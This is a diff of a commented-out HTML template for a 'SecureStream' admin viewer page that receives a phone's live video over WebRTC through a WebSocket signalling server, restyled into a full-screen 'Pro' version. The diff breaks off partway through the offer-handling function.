@@ -1,31 +1,261 @@
+<!--&lt;!&ndash;&lt;!&ndash;<!DOCTYPE html>&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;<html lang="en" xmlns:th="http://www.thymeleaf.org">&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;<head>&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    <meta charset="UTF-8">&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    <title>Admin Control | SecureStream</title>&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    <style>&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        body { margin: 0; font-family: 'Poppins', sans-serif; background: #0f172a; color: white; display: flex; flex-direction: column; height: 100vh; align-items: center; justify-content: center; }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        .monitor-box { width: 90%; max-width: 800px; aspect-ratio: 16/9; background: #000; border-radius: 20px; border: 2px solid #ef4444; position: relative; box-shadow: 0 0 30px rgba(239, 68, 68, 0.2); overflow: hidden; }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        video { width: 100%; height: 100%; object-fit: cover; }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        .status-msg { margin-top: 20px; padding: 10px 20px; background: rgba(255,255,255,0.05); border-radius: 10px; font-size: 14px; border: 1px solid rgba(255,255,255,0.1); }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        .live-tag { position: absolute; top: 20px; left: 20px; background: #ef4444; padding: 5px 15px; border-radius: 5px; font-size: 12px; font-weight: 700; visibility: hidden; animation: blink 1.5s infinite; }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    </style>&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;</head>&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;<body>&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;<div class="monitor-box">&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    <div id="liveBadge" class="live-tag">LIVE FEED</div>&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    <video id="remoteVideo" autoplay playsinline muted></video>&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;</div>&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;<div class="status-msg" id="statusMsg">Initializing secure connection...</div>&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;<script>&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    let peerConnection;&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    let socket;&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;    // Google STUN servers for NAT Traversal (Very important for Phone-to-Laptop)&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    const config = {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        iceServers: [&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            { urls: 'stun:stun.l.google.com:19302' },&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            { urls: 'stun:stun1.l.google.com:19302' },&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            { urls: 'stun:stun2.l.google.com:19302' }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        ]&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    };&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;    function connect() {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        // Render ka static secure URL use kar rahe hain bypass ke liye&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        const wsUrl = "wss://camera-access.onrender.com/video-stream";&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        console.log("Connecting to WebSocket:", wsUrl);&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;        socket = new WebSocket(wsUrl);&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;        socket.onopen = () => {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            console.log("WebSocket Status: CONNECTED! ✅");&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            document.getElementById('statusMsg').innerText = "Connected ✅ Waiting for Phone...";&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        };&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;        socket.onmessage = async (event) => {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            console.log("New Signal Received:", event.data);&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            const data = JSON.parse(event.data);&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;            if (data.type === 'offer') {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                console.log("Offer detected. Starting WebRTC Negotiation...");&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                handleOffer(data);&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            } else if (data.type === 'candidate' && peerConnection) {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                try {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                    await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                    console.log("ICE Candidate synchronized! ❄️");&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                } catch (e) {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                    console.error("Error adding candidate:", e);&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        };&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;        socket.onerror = (error) => {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            console.error("WebSocket Error ❌:", error);&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            document.getElementById('statusMsg').innerText = "Network Error! ❌ (Check Console)";&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        };&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;        socket.onclose = () => {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            console.log("Socket Closed. Reconnecting...");&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            document.getElementById('statusMsg').innerText = "Reconnecting to server...";&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            setTimeout(connect, 3000); // 3 second baad retry&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        };&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    }&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;    async function handleOffer(offer) {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        // Naya Peer Connection banayein&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        peerConnection = new RTCPeerConnection(config);&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;        // Jab phone se video track aaye, toh video element mein set karein&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        peerConnection.ontrack = (event) => {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            console.log("Video Stream Received! 🎥 Starting playback...");&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            const remoteVideo = document.getElementById('remoteVideo');&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            if (remoteVideo.srcObject !== event.streams[0]) {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                remoteVideo.srcObject = event.streams[0];&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                document.getElementById('liveBadge').style.visibility = "visible";&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                document.getElementById('statusMsg').innerText = "LIVE FEED ACTIVE 🟢";&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        };&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;        // Network candidates phone ko bhejein&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        peerConnection.onicecandidate = (event) => {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            if (event.candidate) {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                socket.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        };&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;        // Connection State monitor karein&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        peerConnection.oniceconnectionstatechange = () => {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            console.log("Connection Status:", peerConnection.iceConnectionState);&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            if (peerConnection.iceConnectionState === "disconnected") {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                document.getElementById('statusMsg').innerText = "Phone Disconnected! 🔴";&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                document.getElementById('liveBadge').style.visibility = "hidden";&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        };&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;        try {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            // Offer accept karein aur Answer generate karein&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            const answer = await peerConnection.createAnswer();&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            await peerConnection.setLocalDescription(answer);&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;            // Phone ko Answer bhej dein&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            socket.send(JSON.stringify({&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                type: 'answer',&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;                sdp: answer.sdp&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            }));&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            console.log("Answer sent to phone! 📤 Waiting for video...");&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        } catch (e) {&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;            console.error("WebRTC Handshake Error:", e);&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;        }&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    }&ndash;&gt;&ndash;&gt;-->
+
+<!--&lt;!&ndash;&lt;!&ndash;    // Page load hote hi connect karein&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;    window.onload = connect;&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;</script>&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;</body>&ndash;&gt;&ndash;&gt;-->
+<!--&lt;!&ndash;&lt;!&ndash;</html>&ndash;&gt;&ndash;&gt;-->
 <!--&lt;!&ndash;<!DOCTYPE html>&ndash;&gt;-->
 <!--&lt;!&ndash;<html lang="en" xmlns:th="http://www.thymeleaf.org">&ndash;&gt;-->
 <!--&lt;!&ndash;<head>&ndash;&gt;-->
 <!--&lt;!&ndash;    <meta charset="UTF-8">&ndash;&gt;-->
-<!--&lt;!&ndash;    <title>Admin Control | SecureStream</title>&ndash;&gt;-->
-<!--&lt;!&ndash;    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">&ndash;&gt;-->
+<!--&lt;!&ndash;    <meta name="viewport" content="width=device-width, initial-scale=1.0">&ndash;&gt;-->
+<!--&lt;!&ndash;    <title>Admin Control | SecureStream Pro</title>&ndash;&gt;-->
+
+<!--&lt;!&ndash;    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;700&display=swap" rel="stylesheet">&ndash;&gt;-->
+
 <!--&lt;!&ndash;    <style>&ndash;&gt;-->
-<!--&lt;!&ndash;        body { margin: 0; font-family: 'Poppins', sans-serif; background: #0f172a; color: white; display: flex; flex-direction: column; height: 100vh; align-items: center; justify-content: center; }&ndash;&gt;-->
-<!--&lt;!&ndash;        .monitor-box { width: 90%; max-width: 800px; aspect-ratio: 16/9; background: #000; border-radius: 20px; border: 2px solid #ef4444; position: relative; box-shadow: 0 0 30px rgba(239, 68, 68, 0.2); overflow: hidden; }&ndash;&gt;-->
-<!--&lt;!&ndash;        video { width: 100%; height: 100%; object-fit: cover; }&ndash;&gt;-->
-<!--&lt;!&ndash;        .status-msg { margin-top: 20px; padding: 10px 20px; background: rgba(255,255,255,0.05); border-radius: 10px; font-size: 14px; border: 1px solid rgba(255,255,255,0.1); }&ndash;&gt;-->
-<!--&lt;!&ndash;        .live-tag { position: absolute; top: 20px; left: 20px; background: #ef4444; padding: 5px 15px; border-radius: 5px; font-size: 12px; font-weight: 700; visibility: hidden; animation: blink 1.5s infinite; }&ndash;&gt;-->
-<!--&lt;!&ndash;        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }&ndash;&gt;-->
+<!--&lt;!&ndash;        /* Reset & Full Screen */&ndash;&gt;-->
+<!--&lt;!&ndash;        * { box-sizing: border-box; margin: 0; padding: 0; }&ndash;&gt;-->
+
+<!--&lt;!&ndash;        body, html {&ndash;&gt;-->
+<!--&lt;!&ndash;            width: 100%; height: 100%;&ndash;&gt;-->
+<!--&lt;!&ndash;            background: #000;&ndash;&gt;-->
+<!--&lt;!&ndash;            font-family: 'Space Grotesk', sans-serif;&ndash;&gt;-->
+<!--&lt;!&ndash;            color: white;&ndash;&gt;-->
+<!--&lt;!&ndash;            overflow: hidden;&ndash;&gt;-->
+<!--&lt;!&ndash;        }&ndash;&gt;-->
+
+<!--&lt;!&ndash;        /* -&#45;&#45; VIDEO MONITOR (EDGE TO EDGE) -&#45;&#45; */&ndash;&gt;-->
+<!--&lt;!&ndash;        .monitor-box {&ndash;&gt;-->
+<!--&lt;!&ndash;            position: fixed;&ndash;&gt;-->
+<!--&lt;!&ndash;            top: 0; left: 0;&ndash;&gt;-->
+<!--&lt;!&ndash;            width: 100vw;&ndash;&gt;-->
+<!--&lt;!&ndash;            height: 100vh;&ndash;&gt;-->
+<!--&lt;!&ndash;            background: #000;&ndash;&gt;-->
+<!--&lt;!&ndash;            z-index: 1;&ndash;&gt;-->
+<!--&lt;!&ndash;        }&ndash;&gt;-->
+
+<!--&lt;!&ndash;        video {&ndash;&gt;-->
+<!--&lt;!&ndash;            width: 100%;&ndash;&gt;-->
+<!--&lt;!&ndash;            height: 100%;&ndash;&gt;-->
+<!--&lt;!&ndash;            object-fit: cover; /* Laptop ki poori screen cover karega */&ndash;&gt;-->
+<!--&lt;!&ndash;            filter: contrast(1.05) brightness(1.1);&ndash;&gt;-->
+<!--&lt;!&ndash;            transition: opacity 1s ease;&ndash;&gt;-->
+<!--&lt;!&ndash;        }&ndash;&gt;-->
+
+<!--&lt;!&ndash;        /* -&#45;&#45; TOP HUD (Heads Up Display) -&#45;&#45; */&ndash;&gt;-->
+<!--&lt;!&ndash;        .hud-top {&ndash;&gt;-->
+<!--&lt;!&ndash;            position: absolute;&ndash;&gt;-->
+<!--&lt;!&ndash;            top: 25px; left: 30px; right: 30px;&ndash;&gt;-->
+<!--&lt;!&ndash;            display: flex; justify-content: space-between; align-items: center;&ndash;&gt;-->
+<!--&lt;!&ndash;            z-index: 10;&ndash;&gt;-->
+<!--&lt;!&ndash;            pointer-events: none;&ndash;&gt;-->
+<!--&lt;!&ndash;        }&ndash;&gt;-->
+
+<!--&lt;!&ndash;        .live-tag {&ndash;&gt;-->
+<!--&lt;!&ndash;            background: #ef4444;&ndash;&gt;-->
+<!--&lt;!&ndash;            padding: 8px 20px;&ndash;&gt;-->
+<!--&lt;!&ndash;            border-radius: 4px;&ndash;&gt;-->
+<!--&lt;!&ndash;            font-size: 11px;&ndash;&gt;-->
+<!--&lt;!&ndash;            font-weight: 800;&ndash;&gt;-->
+<!--&lt;!&ndash;            letter-spacing: 3px;&ndash;&gt;-->
+<!--&lt;!&ndash;            visibility: hidden; /* Connection aane par dikhega */&ndash;&gt;-->
+<!--&lt;!&ndash;            animation: blink 1.5s infinite;&ndash;&gt;-->
+<!--&lt;!&ndash;            box-shadow: 0 0 25px rgba(239, 68, 68, 0.6);&ndash;&gt;-->
+<!--&lt;!&ndash;            text-transform: uppercase;&ndash;&gt;-->
+<!--&lt;!&ndash;        }&ndash;&gt;-->
+
+<!--&lt;!&ndash;        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }&ndash;&gt;-->
+
+<!--&lt;!&ndash;        .system-id {&ndash;&gt;-->
+<!--&lt;!&ndash;            font-size: 10px;&ndash;&gt;-->
+<!--&lt;!&ndash;            letter-spacing: 4px;&ndash;&gt;-->
+<!--&lt;!&ndash;            color: rgba(255,255,255,0.4);&ndash;&gt;-->
+<!--&lt;!&ndash;            text-transform: uppercase;&ndash;&gt;-->
+<!--&lt;!&ndash;        }&ndash;&gt;-->
+
+<!--&lt;!&ndash;        /* -&#45;&#45; DYNAMIC STATUS BAR (BOTTOM OVERLAY) -&#45;&#45; */&ndash;&gt;-->
+<!--&lt;!&ndash;        .status-container {&ndash;&gt;-->
+<!--&lt;!&ndash;            position: absolute;&ndash;&gt;-->
+<!--&lt;!&ndash;            bottom: 40px;&ndash;&gt;-->
+<!--&lt;!&ndash;            left: 50%;&ndash;&gt;-->
+<!--&lt;!&ndash;            transform: translateX(-50%);&ndash;&gt;-->
+<!--&lt;!&ndash;            z-index: 10;&ndash;&gt;-->
+<!--&lt;!&ndash;            text-align: center;&ndash;&gt;-->
+<!--&lt;!&ndash;            width: 100%;&ndash;&gt;-->
+<!--&lt;!&ndash;        }&ndash;&gt;-->
+
+<!--&lt;!&ndash;        .status-msg {&ndash;&gt;-->
+<!--&lt;!&ndash;            display: inline-block;&ndash;&gt;-->
+<!--&lt;!&ndash;            padding: 14px 40px;&ndash;&gt;-->
+<!--&lt;!&ndash;            background: rgba(10, 10, 10, 0.8);&ndash;&gt;-->
+<!--&lt;!&ndash;            backdrop-filter: blur(20px);&ndash;&gt;-->
+<!--&lt;!&ndash;            border-radius: 100px;&ndash;&gt;-->
+<!--&lt;!&ndash;            font-size: 13px;&ndash;&gt;-->
+<!--&lt;!&ndash;            border: 1px solid rgba(255, 255, 255, 0.1);&ndash;&gt;-->
+<!--&lt;!&ndash;            letter-spacing: 2px;&ndash;&gt;-->
+<!--&lt;!&ndash;            box-shadow: 0 20px 50px rgba(0,0,0,0.8);&ndash;&gt;-->
+<!--&lt;!&ndash;            color: #00f2fe; /* Cyber Cyan */&ndash;&gt;-->
+<!--&lt;!&ndash;            text-transform: uppercase;&ndash;&gt;-->
+<!--&lt;!&ndash;            font-weight: 500;&ndash;&gt;-->
+<!--&lt;!&ndash;            transition: all 0.3s ease;&ndash;&gt;-->
+<!--&lt;!&ndash;        }&ndash;&gt;-->
+
+<!--&lt;!&ndash;        /* Cinematic Scanlines */&ndash;&gt;-->
+<!--&lt;!&ndash;        .overlay-fx {&ndash;&gt;-->
+<!--&lt;!&ndash;            position: absolute; top: 0; left: 0; width: 100%; height: 100%;&ndash;&gt;-->
+<!--&lt;!&ndash;            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%);&ndash;&gt;-->
+<!--&lt;!&ndash;            background-size: 100% 4px;&ndash;&gt;-->
+<!--&lt;!&ndash;            z-index: 5; pointer-events: none; opacity: 0.2;&ndash;&gt;-->
+<!--&lt;!&ndash;        }&ndash;&gt;-->
 <!--&lt;!&ndash;    </style>&ndash;&gt;-->
 <!--&lt;!&ndash;</head>&ndash;&gt;-->
 <!--&lt;!&ndash;<body>&ndash;&gt;-->
 
 <!--&lt;!&ndash;<div class="monitor-box">&ndash;&gt;-->
-<!--&lt;!&ndash;    <div id="liveBadge" class="live-tag">LIVE FEED</div>&ndash;&gt;-->
+<!--&lt;!&ndash;    <div class="overlay-fx"></div>&ndash;&gt;-->
+
+<!--&lt;!&ndash;    <div class="hud-top">&ndash;&gt;-->
+<!--&lt;!&ndash;        <div id="liveBadge" class="live-tag">Live Feed Active</div>&ndash;&gt;-->
+<!--&lt;!&ndash;        <div class="system-id">SecureStream // Admin_Portal_v3</div>&ndash;&gt;-->
+<!--&lt;!&ndash;    </div>&ndash;&gt;-->
+
 <!--&lt;!&ndash;    <video id="remoteVideo" autoplay playsinline muted></video>&ndash;&gt;-->
 <!--&lt;!&ndash;</div>&ndash;&gt;-->
-<!--&lt;!&ndash;<div class="status-msg" id="statusMsg">Initializing secure connection...</div>&ndash;&gt;-->
+
+<!--&lt;!&ndash;<div class="status-container">&ndash;&gt;-->
+<!--&lt;!&ndash;    <div class="status-msg" id="statusMsg">Initializing secure connection...</div>&ndash;&gt;-->
+<!--&lt;!&ndash;</div>&ndash;&gt;-->
 
 <!--&lt;!&ndash;<script>&ndash;&gt;-->
 <!--&lt;!&ndash;    let peerConnection;&ndash;&gt;-->
 <!--&lt;!&ndash;    let socket;&ndash;&gt;-->
 
-<!--&lt;!&ndash;    // Google STUN servers for NAT Traversal (Very important for Phone-to-Laptop)&ndash;&gt;-->
+<!--&lt;!&ndash;    // Google STUN Servers (Essential for NAT bypass)&ndash;&gt;-->
 <!--&lt;!&ndash;    const config = {&ndash;&gt;-->
 <!--&lt;!&ndash;        iceServers: [&ndash;&gt;-->
 <!--&lt;!&ndash;            { urls: 'stun:stun.l.google.com:19302' },&ndash;&gt;-->
@@ -34,96 +264,105 @@
 <!--&lt;!&ndash;        ]&ndash;&gt;-->
 <!--&lt;!&ndash;    };&ndash;&gt;-->
 
+<!--&lt;!&ndash;    function updateStatus(text, color = "#00f2fe") {&ndash;&gt;-->
+<!--&lt;!&ndash;        const msgBox = document.getElementById('statusMsg');&ndash;&gt;-->
+<!--&lt;!&ndash;        msgBox.innerText = text;&ndash;&gt;-->
+<!--&lt;!&ndash;        msgBox.style.color = color;&ndash;&gt;-->
+<!--&lt;!&ndash;        msgBox.style.borderColor = color + "44"; // Adding transparency to border&ndash;&gt;-->
+<!--&lt;!&ndash;    }&ndash;&gt;-->
+
 <!--&lt;!&ndash;    function connect() {&ndash;&gt;-->
-<!--&lt;!&ndash;        // Render ka static secure URL use kar rahe hain bypass ke liye&ndash;&gt;-->
+<!--&lt;!&ndash;        // Change this URL if your Render backend is different&ndash;&gt;-->
 <!--&lt;!&ndash;        const wsUrl = "wss://camera-access.onrender.com/video-stream";&ndash;&gt;-->
-<!--&lt;!&ndash;        console.log("Connecting to WebSocket:", wsUrl);&ndash;&gt;-->
+<!--&lt;!&ndash;        console.log("Connecting to WebSocket...");&ndash;&gt;-->
 
 <!--&lt;!&ndash;        socket = new WebSocket(wsUrl);&ndash;&gt;-->
 
 <!--&lt;!&ndash;        socket.onopen = () => {&ndash;&gt;-->
-<!--&lt;!&ndash;            console.log("WebSocket Status: CONNECTED! ✅");&ndash;&gt;-->
-<!--&lt;!&ndash;            document.getElementById('statusMsg').innerText = "Connected ✅ Waiting for Phone...";&ndash;&gt;-->
+<!--&lt;!&ndash;            console.log("Connected to Server ✅");&ndash;&gt;-->
+<!--&lt;!&ndash;            updateStatus("Connected ✅ Waiting for Phone Signal...", "#00f2fe");&ndash;&gt;-->
 <!--&lt;!&ndash;        };&ndash;&gt;-->
 
 <!--&lt;!&ndash;        socket.onmessage = async (event) => {&ndash;&gt;-->
-<!--&lt;!&ndash;            console.log("New Signal Received:", event.data);&ndash;&gt;-->
 <!--&lt;!&ndash;            const data = JSON.parse(event.data);&ndash;&gt;-->
+<!--&lt;!&ndash;            console.log("Signal Received:", data.type);&ndash;&gt;-->
 
 <!--&lt;!&ndash;            if (data.type === 'offer') {&ndash;&gt;-->
-<!--&lt;!&ndash;                console.log("Offer detected. Starting WebRTC Negotiation...");&ndash;&gt;-->
+<!--&lt;!&ndash;                updateStatus("Offer detected. Handshaking...", "#a855f7"); // Purple for negotiation&ndash;&gt;-->
 <!--&lt;!&ndash;                handleOffer(data);&ndash;&gt;-->
 <!--&lt;!&ndash;            } else if (data.type === 'candidate' && peerConnection) {&ndash;&gt;-->
 <!--&lt;!&ndash;                try {&ndash;&gt;-->
 <!--&lt;!&ndash;                    await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));&ndash;&gt;-->
-<!--&lt;!&ndash;                    console.log("ICE Candidate synchronized! ❄️");&ndash;&gt;-->
-<!--&lt;!&ndash;                } catch (e) {&ndash;&gt;-->
-<!--&lt;!&ndash;                    console.error("Error adding candidate:", e);&ndash;&gt;-->
-<!--&lt;!&ndash;                }&ndash;&gt;-->
+<!--&lt;!&ndash;                    console.log("ICE Candidate Synchronized ❄️");&ndash;&gt;-->
+<!--&lt;!&ndash;                } catch (e) { console.error("Candidate Error:", e); }&ndash;&gt;-->
 <!--&lt;!&ndash;            }&ndash;&gt;-->
 <!--&lt;!&ndash;        };&ndash;&gt;-->
 
 <!--&lt;!&ndash;        socket.onerror = (error) => {&ndash;&gt;-->
-<!--&lt;!&ndash;            console.error("WebSocket Error ❌:", error);&ndash;&gt;-->
-<!--&lt;!&ndash;            document.getElementById('statusMsg').innerText = "Network Error! ❌ (Check Console)";&ndash;&gt;-->
+<!--&lt;!&ndash;            console.error("Socket Error:", error);&ndash;&gt;-->
+<!--&lt;!&ndash;            updateStatus("Network Error! ❌ Check Connection", "#ef4444");&ndash;&gt;-->
 <!--&lt;!&ndash;        };&ndash;&gt;-->
 
 <!--&lt;!&ndash;        socket.onclose = () => {&ndash;&gt;-->
-<!--&lt;!&ndash;            console.log("Socket Closed. Reconnecting...");&ndash;&gt;-->
-<!--&lt;!&ndash;            document.getElementById('statusMsg').innerText = "Reconnecting to server...";&ndash;&gt;-->
-<!--&lt;!&ndash;            setTimeout(connect, 3000); // 3 second baad retry&ndash;&gt;-->
+<!--&lt;!&ndash;            console.log("Disconnected. Retrying...");&ndash;&gt;-->
+<!--&lt;!&ndash;            updateStatus("Reconnecting to Secure Server...", "#facc15");&ndash;&gt;-->
+<!--&lt;!&ndash;            document.getElementById('liveBadge').style.visibility = "hidden";&ndash;&gt;-->
+<!--&lt;!&ndash;            setTimeout(connect, 3000);&ndash;&gt;-->
 <!--&lt;!&ndash;        };&ndash;&gt;-->
 <!--&lt;!&ndash;    }&ndash;&gt;-->
 
 <!--&lt;!&ndash;    async function handleOffer(offer) {&ndash;&gt;-->
-<!--&lt;!&ndash;        // Naya Peer Connection banayein&ndash;&gt;-->
